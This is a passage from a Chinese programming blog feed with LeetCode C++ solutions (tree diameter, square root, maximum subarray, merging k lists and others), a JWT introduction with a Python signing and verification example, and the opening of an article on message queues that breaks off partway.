id="二叉树的直径">二叉树的直径</h2><blockquote><p>深度优先搜索。一条路径的长度为该路径经过的节点数减一，所以求直径（即求路径长度的最大值）等效于求路径经过节点数的最大值减一。而任意一条路径均可以被看作由某个节点为起点，从其左儿子和右儿子向下遍历的路径拼接得到。假设我们知道对于该节点的左儿子向下遍历经过最多的节点数L （即以左儿子为根的子树的深度） 和其右儿子向下遍历经过最多的节点数 R（即以右儿子为根的子树的深度），那么以该节点为起点的路径经过节点数的最大值即为L+R+1 。我们记节点 node 为起点的路径经过节点数的最大值为 <spanclass="math display">\[d_{\textit{node}}\]</span>，那么二叉树的直径就是所有节点 <spanclass="math display">\[d_{\textit{node}}\]</span>的最大值减一。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">1</span>;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">diameterOfBinaryTree</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-built_in">depth</span>(root);<br>        <span class="hljs-keyword">return</span> ans - <span class="hljs-number">1</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">depth</span><span class="hljs-params">(TreeNode* root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-literal">nullptr</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br>        <span class="hljs-type">int</span> left = <span class="hljs-built_in">depth</span>(root-&gt;left);<br>        <span class="hljs-type">int</span> right = <span class="hljs-built_in">depth</span>(root-&gt;right);<br>        ans = <span class="hljs-built_in">max</span>(ans, left + right + <span class="hljs-number">1</span>);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">max</span>(left, right) + <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="解决子问题">2. 解决子问题</h1><h2 id="x的平方根">x的平方根</h2><blockquote><p>由于 x 平方根的整数部分 ans 是满足 k<sup>2</sup> ≤ x 的最大 k值，因此我们可以对 k 进行二分查找，从而得到答案。二分查找的下界为0，上界可以粗略地设定为 x。在二分查找的每一步中，我们只需要比较中间元素mid 的平方与 x的大小关系，并通过比较的结果调整上下界的范围。由于我们所有的运算都是整数运算，不会存在误差，因此在得到最终的答案ans 后，也就不需要再去尝试 ans+1 了。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">mySqrt</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans;<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = x;<br><br>        <span class="hljs-keyword">while</span> (left &lt;= right) &#123;<br>            <span class="hljs-type">int</span> mid = left + (right - left) / <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span> ((<span class="hljs-type">long</span>)mid * mid &lt;= x) &#123;<br>                ans = mid;<br>                left = mid + <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                right = mid - <span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="最大子数组和">最大子数组和</h2><blockquote><p>用 f(i) 代表以第 i个数结尾的「连续子数组的最大和」，因此我们只需要求出每个位置的f(i)，然后返回 f 数组中的最大值即可。那么我们如何求 f(i)呢？我们可以考虑 nums[i] 单独成为一段还是加入 f(i−1)对应的那一段，这取决于 nums[i] 和 f(i−1)+nums[i]的大小，我们希望获得一个比较大的，于是可以写出这样的动态规划转移方程：<code>f(i)=max&#123;f(i−1)+nums[i],nums[i]&#125;</code>。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">maxSubArray</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums)</span> </span>&#123;<br>        <span class="hljs-type">int</span> ans = nums[<span class="hljs-number">0</span>];<br>        <span class="hljs-type">int</span> pre = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> num : nums) &#123;<br>            pre = <span class="hljs-built_in">max</span>(pre + num, num);<br>            ans = <span class="hljs-built_in">max</span>(ans, pre);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2id="在排序数组中查找元素的第一个和最后一个位置">在排序数组中查找元素的第一个和最后一个位置</h2><blockquote><p>直观的思路肯定是从前往后遍历一遍。用两个变量记录第一次和最后一次遇见target 的下标，但这个方法的时间复杂度为O(n)，没有利用到数组升序排列的条件。由于数组已经排序，因此整个数组是单调递增的，我们可以利用二分法来加速查找的过程。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">searchRange</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>        <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = nums.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>, mid;<br>        <span class="hljs-type">bool</span> find = <span class="hljs-literal">false</span>;<br>        <br>        <span class="hljs-keyword">while</span> (left &lt;= right) &#123;<br>            mid = left + (right - left) / <span class="hljs-number">2</span>;<br>            <span class="hljs-keyword">if</span> (nums[mid] &lt; target) &#123;<br>                left = mid + <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nums[mid] &gt; target) &#123;<br>                right = mid - <span class="hljs-number">1</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                find = <span class="hljs-literal">true</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (find) &#123;<br>            <span class="hljs-type">int</span> start = mid, end = mid;<br>            <span class="hljs-keyword">while</span> (start &gt;= <span class="hljs-number">0</span> &amp;&amp; nums[start] == nums[mid]) &#123;<br>                start--;<br>            &#125;<br>            <span class="hljs-keyword">while</span> (end &lt; nums.<span class="hljs-built_in">size</span>() &amp;&amp; nums[end] == nums[mid]) &#123;<br>                end++;<br>            &#125;<br>            <span class="hljs-keyword">return</span> &#123;start + <span class="hljs-number">1</span>, end - <span class="hljs-number">1</span>&#125;;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-number">-1</span>, <span class="hljs-number">-1</span>&#125;;<br>        &#125;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h1 id="合并结果">3. 合并结果</h1><h2 id="合并k个排序链表">合并K个排序链表</h2><blockquote><p>用分治的方法进行合并：将链表数组不断划分为左右两部分。将 k个链表配对并将同一对中的链表合并；第一轮合并以后， k 个链表被合并成了k/2 个链表，平均长度为 2n/k ，然后是 k/4 个链表， k/8个链表等等；重复这一过程，直到我们得到了最终的有序链表。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">ListNode* <span class="hljs-title">mergeTwoLists</span><span class="hljs-params">(ListNode* list1, ListNode* list2)</span> </span>&#123;<br>        ListNode* dummyHead = <span class="hljs-keyword">new</span> <span class="hljs-built_in">ListNode</span>();<br>        ListNode* tail = dummyHead;<br>        <span class="hljs-keyword">while</span> (list1 &amp;&amp; list2) &#123;<br>            <span class="hljs-keyword">if</span> (list1-&gt;val &lt; list2-&gt;val) &#123;<br>                tail-&gt;next = list1;<br>                list1 = list1-&gt;next;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                tail-&gt;next = list2;<br>                list2 = list2-&gt;next;<br>            &#125;<br>            tail = tail-&gt;next;<br>        &#125;<br>        tail-&gt;next = list1 ? list1 : list2;<br>        <span class="hljs-keyword">return</span> dummyHead-&gt;next;<br>    &#125;<br><br>    <span class="hljs-function">ListNode* <span class="hljs-title">merge</span><span class="hljs-params">(vector&lt;ListNode*&gt;&amp; lists, <span class="hljs-type">int</span> l, <span class="hljs-type">int</span> r)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (l == r)<br>            <span class="hljs-keyword">return</span> lists[l];<br>        <span class="hljs-keyword">if</span> (l &gt; r)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br><br>        <span class="hljs-type">int</span> mid = (l + r) &gt;&gt; <span class="hljs-number">1</span>;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">mergeTwoLists</span>(<span class="hljs-built_in">merge</span>(lists, l, mid), <span class="hljs-built_in">merge</span>(lists, mid + <span class="hljs-number">1</span>, r));<br>    &#125;<br><br>    <span class="hljs-function">ListNode* <span class="hljs-title">mergeKLists</span><span class="hljs-params">(vector&lt;ListNode*&gt;&amp; lists)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">merge</span>(lists, <span class="hljs-number">0</span>, lists.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h2 id="统计全为-1-的正方形子矩阵">统计全为 1 的正方形子矩阵</h2><blockquote><p>用 <code>f[i][j]</code>表示以 <code>(i, j)</code>为右下角的正方形的最大边长，那么除此定义之外，<code>f[i][j] = x</code>也表示以 <code>(i, j)</code> 为右下角的正方形的数目为<code>x</code>（即边长为 1, 2, ..., x 的正方形各一个）。在计算出所有的<code>f[i][j]</code>后，我们将它们进行累加，就可以得到矩阵中正方形的数目。挖掘<code>f[i][j]</code>与相邻位置的关系来计算出 <code>f[i][j]</code>的值。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">countSquares</span><span class="hljs-params">(vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt;&amp; matrix)</span> </span>&#123;<br>        <span class="hljs-type">int</span> m = matrix.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> n = matrix[<span class="hljs-number">0</span>].<span class="hljs-built_in">size</span>();<br>        vector&lt;vector&lt;<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">f</span>(m, <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n));<br>        <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m; i++) &#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; n; j++) &#123;<br>                <span class="hljs-keyword">if</span> (i == <span class="hljs-number">0</span> || j == <span class="hljs-number">0</span>) &#123;<br>                    f[i][j] = matrix[i][j];<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (matrix[i][j] == <span class="hljs-number">0</span>) &#123;<br>                    f[i][j] = <span class="hljs-number">0</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    f[i][j] =<br>                        <span class="hljs-built_in">min</span>(<span class="hljs-built_in">min</span>(f[i][j - <span class="hljs-number">1</span>], f[i - <span class="hljs-number">1</span>][j]), f[i - <span class="hljs-number">1</span>][j - <span class="hljs-number">1</span>]) + <span class="hljs-number">1</span>;<br>                &#125;<br>                ans += f[i][j];<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>LeetCode</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>JWT</title>
    <link href="/2024/06/14/Python/%E8%BF%9B%E9%98%B6%E7%AF%87/JWT/"/>
    <url>/2024/06/14/Python/%E8%BF%9B%E9%98%B6%E7%AF%87/JWT/</url>
    
    <content type="html"><![CDATA[<h1 id="简介">1. 简介</h1><p>JSON Web Token（JWT）是一项开放标准（<ahref="https://tools.ietf.org/html/rfc7519">RFC7519</a>），它定义了一种紧凑且独立的方式，用于将信息作为 JSON对象在各方之间安全地传输。由于该信息经过数字签名，因此可以被验证和信任。可以使用密钥（使用<strong>HMAC</strong> 算法）或使用 <strong>RSA</strong> 或<strong>ECDSA</strong> 的公钥/私钥对 JWT进行签名。JWT是目前最流行的跨域身份验证解决方案。</p><h1 id="应用场景">2. 应用场景</h1><ul><li><strong>授权</strong>：这是使用 JWT的最常见方案。用户登录后，每个后续请求都将包含JWT，从而允许用户访问该令牌允许的路由、服务和资源。单点登录是目前广泛使用JWT 的一项功能，因为它的开销小，而且可以在不同域中轻松使用。</li><li><strong>信息交换</strong>：JSON WebToken是在各方之间安全传输信息的好方法。由于 JWT可以签名（例如，使用公钥/私钥对），因此您可以确定发送者是他们所说的人。此外，由于签名是使用标头和有效负载计算的，因此还可以验证内容是否未被篡改。</li></ul><h1 id="认证过程">3. 认证过程</h1><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406141351646.png"alt="image-20240614111937680" /><figcaption aria-hidden="true">image-20240614111937680</figcaption></figure><h1 id="令牌结构">4. 令牌结构</h1><p>JWT通常包含三个部分，用<code>.</code>分隔：</p><ul><li><strong>Header</strong>（头部）</li><li><strong>Payload</strong>（负载）</li><li><strong>Signature</strong>（签名）</li></ul><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">xxxxx.yyyyy.zzzzz<br></code></pre></td></tr></table></figure><h2 id="头部">4.1 头部</h2><p>Header通常包含两部分信息：</p><ul><li>类型（typ）：即JWT</li><li>签名算法（alg）：如HMAC SHA256（写为HS256）或RSA</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;alg&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;HS256&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;typ&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;JWT&quot;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>然后对头部进行<strong>Base64Url</strong>编码以形成 JSON Web Token的第二部分。</p><h2 id="负载">4.2 负载</h2><p>Payload部分包含声明（claims），声明是关于实体（通常是用户）和其他数据的声明。JWT中有三种类型的声明：</p><ul><li>注册声明（Registeredclaims）：这些是一组预定义的声明，它们不是强制性的，但建议使用，以提供一组有用的、可互操作的声明。如<code>iss</code>（签发者）、<code>exp</code>（过期时间）、<code>sub</code>（主题）、<code>aud</code>（受众）等。</li><li>公共声明（Public claims）：这些声明可以由使用 JWT的用户随意定义。但为了避免冲突，应在<ahref="https://www.iana.org/assignments/jwt/jwt.xhtml">IANA JSON WebToken Registry</a>中定义它们，或将其定义为包含抗冲突命名空间的URI。</li><li>私有声明（Privateclaims）：这些是为在同意使用它们的各方之间共享信息而创建的自定义声明，既不是注册声明也不是公开声明。</li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;sub&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1234567890&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;John Doe&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;admin&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>然后对有效负载进行<strong>Base64Url</strong>编码以形成 JSON Web Token的第二部分。</p><blockquote><p>请注意，对于已签名的令牌来说，这些信息虽然可以防止篡改，但任何人都可以读取。除非经过加密，否则不要在JWT 的有效载荷或标头元素中加入秘密信息。</p></blockquote><h2 id="签名">4.3 签名</h2><p>签名用于验证消息在传输过程中未被更改，并且，对于使用私钥签名的令牌，它还可以验证JWT的发送者是否是其所述的那个人。首先需要对Header和Payload进行编码，然后使用指定的算法和密钥对编码后的数据进行签名。</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">HMACSHA256(<br>  <span class="hljs-name">base64UrlEncode</span>(<span class="hljs-name">header</span>) + <span class="hljs-string">&quot;.&quot;</span> +<br>  base64UrlEncode(<span class="hljs-name">payload</span>),<br>  secret)<br></code></pre></td></tr></table></figure><h2 id="示例">4.4 示例</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406141351647.png"alt="image-20240614134247101" /><figcaption aria-hidden="true">image-20240614134247101</figcaption></figure><h1 id="简单示例">5. 简单示例</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> datetime<br><br><span class="hljs-comment"># 定义密钥</span><br>SECRET_KEY = <span class="hljs-string">&#x27;your-secret-key&#x27;</span><br><br><br><span class="hljs-comment"># 生成JWT</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_jwt</span>():<br>    payload = &#123;<br>        <span class="hljs-string">&#x27;sub&#x27;</span>: <span class="hljs-string">&#x27;1234567890&#x27;</span>,<br>        <span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;John Doe&#x27;</span>,<br>        <span class="hljs-string">&#x27;admin&#x27;</span>: <span class="hljs-literal">True</span>,<br>        <span class="hljs-string">&#x27;iat&#x27;</span>: datetime.datetime.utcnow(),  <span class="hljs-comment"># 签发时间</span><br>        <span class="hljs-string">&#x27;exp&#x27;</span>: datetime.datetime.utcnow() + datetime.timedelta(minutes=<span class="hljs-number">30</span>)  <span class="hljs-comment"># 过期时间</span><br>    &#125;<br>    token = jwt.encode(payload, SECRET_KEY, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>    <span class="hljs-keyword">return</span> token<br><br><br><span class="hljs-comment"># 验证JWT</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_jwt</span>(<span class="hljs-params">token</span>):<br>    <span class="hljs-keyword">try</span>:<br>        decoded_payload = jwt.decode(token, SECRET_KEY, algorithms=[<span class="hljs-string">&#x27;HS256&#x27;</span>])<br>        <span class="hljs-keyword">return</span> decoded_payload<br>    <span class="hljs-keyword">except</span> jwt.ExpiredSignatureError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;JWT has expired&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">except</span> jwt.InvalidTokenError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid JWT&quot;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-comment"># 示例运行</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 生成JWT</span><br>    token = generate_jwt()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Generated JWT: <span class="hljs-subst">&#123;token&#125;</span>&quot;</span>)<br><br>    <span class="hljs-comment"># 验证JWT</span><br>    decoded_payload = verify_jwt(token)<br>    <span class="hljs-keyword">if</span> decoded_payload:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decoded Payload: <span class="hljs-subst">&#123;decoded_payload&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p><strong>参考资料：</strong></p><ol type="1"><li><a href="https://jwt.io/introduction">JSON Web Tokens 简介</a></li><li><ahref="https://www.jianshu.com/p/d1644e281250">JWT全面解读、详细使用步骤</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>进阶篇</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>消息队列</title>
    <link href="/2024/06/11/Python/%E8%BF%9B%E9%98%B6%E7%AF%87/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/"/>
    <url>/2024/06/11/Python/%E8%BF%9B%E9%98%B6%E7%AF%87/%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<h1 id="简介">1. 简介</h1><p>消息队列（MessageQueue，MQ）是一个存放消息的容器，当我们需要使用消息的时候，直接从容器中取出消息供自己使用即可。本质上就是一个<strong>队列结构的中间件</strong>，由于队列是一种先进先出的数据结构，所以消费消息时也是按照顺序来消费的。参与消息传递的双方称为<strong>生产者</strong>和<strong>消费者</strong>，生产者负责发送消息，消费者负责处理消息。</p><p>消息中间件是分布式系统中重要的组件，主要解决异步处理，应用解耦，流量削峰等问题，实现高性能，高可用，可伸缩和最终一致性的系统架构。目前使用较多的消息队列有ActiveMQ，RabbitMQ，ZeroMQ，Kafka，MetaMQ，RocketMQ等。</p><h1 id="应用场景">2. 应用场景</h1><h2 id="异步处理">2.1 异步处理</h2><p>异步处理就是将一些非核心的业务流程以异步并行的方式执行，从而减少请求响应时间，提高系统吞吐量。以下单为例，用户下单后需要生成订单、发送活动积分、发送红包券、发送下单通知等一系列业务处理。假设三个业务节点每个使用100毫秒钟，不考虑网络等其他开销，则串行方式的时间是400毫秒，并行的时间只需要200毫秒。这样就大大提高了系统的吞吐量。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406111134209.png"alt="image-20240611103648338" /><figcaption aria-hidden="true">image-20240611103648338</figcaption></figure><h2 id="应用解耦">2.2 应用解耦</h2><p>应用解耦就是解除应用系统之间的耦合依赖。以电商系统为例，用户下单后，订单系统需要通知积分系统。一般的做法是：订单系统直接调用积分系统的接口。这就使得应用系统间的耦合特别紧密。如果积分系统无法访问，则积分处理失败，从而导致订单失败。加入消息队列之后，用户下单后，订单系统完成下单业务后，将消息写入消息队列，返回用户订单下单成功。积分系统通过订阅下单消息的方式获取下单通知消息，从而进行积分操作。实现订单系统与积分系统的应用解耦。如果在下单时积分系统系统异常，也不影响用户正常下单，因为下单后，订单系统写入消息队列就不再关心其他的后续操作。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406111134211.png"alt="image-20240611104033853" /><figcaption aria-hidden="true">image-20240611104033853</figcaption></figure><h2 id="流量削峰">2.3 流量削峰</h2><p>先将短时间高并发产生的事务消息存储在消息队列中，然后后端服务再慢慢根据自己的能力去消费这些消息，这样就避免直接把后端服务打垮掉。在电子商务一些秒杀、促销活动中，合理使用消息队列可以有效抵御促销活动刚开始大量订单涌入对系统的冲击。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406111134212.png"alt="image-20240611104320556" /><figcaption aria-hidden="true">image-20240611104320556</figcaption></figure><h1 id="消息模型">3. 消息模型</h1><h2 id="点对点模型">3.1 点对点模型</h2><p>使用队列（Queue）作为消息通信载体；一条消息只能被一个消费者使用，未被消费的消息在队列中保留直到被消费或超时。比如：生产者发送100条消息，两个消费者来消费，一般情况下两个消费者会按照消息发送的顺序各自消费一半。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406111134213.png"alt="image-20240611104922844" /><figcaption aria-hidden="true">image-20240611104922844</figcaption></figure><h2 id="发布订阅模型">3.2 发布订阅模型</h2><p>使用主题（Topic）作为消息通信载体，类似于广播模式；发布者发布一条消息，该消息通过主题传递给所有的订阅者。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202406111134214.png"alt="image-20240611105045445" /><figcaption aria-hidden="true">image-20240611105045445</figcaption></figure><h1 id="简单示例">4. 简单示例</h1><h2 id="生产者">4.1 生产者</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 